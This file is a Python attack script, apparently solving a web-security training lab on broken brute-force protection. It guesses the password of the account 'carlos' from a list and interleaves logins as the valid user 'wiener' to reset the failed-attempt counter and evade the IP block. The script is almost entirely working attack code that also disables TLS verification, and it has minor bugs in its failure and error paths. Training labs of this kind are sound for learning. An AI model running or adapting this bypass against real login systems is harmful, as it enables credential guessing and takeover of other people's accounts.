"""
  Lab: Broken brute-force protection, IP block

  Steps:
  1. Read password list
  2. Brute force carlos password (login with as wiener before 
      each try to bypass blocking)
  3. Fetch carlos profile

  Author: D4mn20
"""
import argparse
import time
import sys
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

START_TIME = time.time()

def read_list(filepath):
  try:
    with open(filepath, 'rt') as file:
      data = file.readlines()
      return data
  except ValueError as e:
    print(f"{Fore.RED}[-] Failed to read file: {filepath}\nErro:{e}")
    exit(1)

def login(url, data, session):
  try:
    response = session.post(f"{url}/login", data, allow_redirects=False)
    # print(f"{Fore.BLUE}[DEGUB]{Fore.RESET} {response.text}")
    return response
  except ValueError as e:
    print(f"{Fore.RED}[-] Failed to login as {data.username}.\n{e}{Fore.RESET}")
    exit(1)

def enumerate_password(url, valid_user, passwords, session):
  for idx, password in enumerate(passwords):
    password = password.strip()
    msg = f"[{idx+1}] Trying: {Fore.YELLOW}{password:<50}{Fore.RESET}"
    sys.stdout.write(f"\r{msg}")
    sys.stdout.flush()
    if idx % 2 == 0:
      valid_user = {
        "username": 'wiener',
        "password": 'peter'
      }
      login(url, valid_user, session)
      data = {
        "username": 'carlos',
        "password": password
      }
      response = login(url, data, session)
    else:
      data = {
        "username": 'carlos',
        "password": password
      }
      response = login(url, data, session)
    if response.status_code == 302:
      return session, password
  return None 

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help='Target URL')
  parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
  args = parser.parse_args()

  print(f"{Fore.BLUE} Starting...")
  session = requests.session()
  if args.proxy:
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False

  print(f"{Fore.RESET}STEP 1: Reading password lists")
  passwords = read_list('../passwords.txt')
  print(f"{Fore.GREEN}[+] The lists were successful loaded.")

  print(f"{Fore.RESET}STEP 2: Brute-forcing password...")
  (session, password) = enumerate_password(args.url, 'carlos', passwords, session)
  if password:
    print(f"\n{Fore.GREEN}[+]{Fore.RESET} Username {Fore.YELLOW}carlos{Fore.RESET}:{Fore.YELLOW}{password}{Fore.RESET} found!")
    session.get(f"{args.url}/my-account", data={"username": 'carlos', "password": password}, allow_redirects=False)
    elapsed_time = int((time.time() - START_TIME))   
    print(f"{Fore.GREEN}[+] Lab finished!{Fore.RESET} Elapsed time: {elapsed_time} seconds.")
  else:
    print(f"\n{Fore.YELLOW}[!] Password not found!{Fore.RESET}")
  
if __name__ == "__main__":
  main()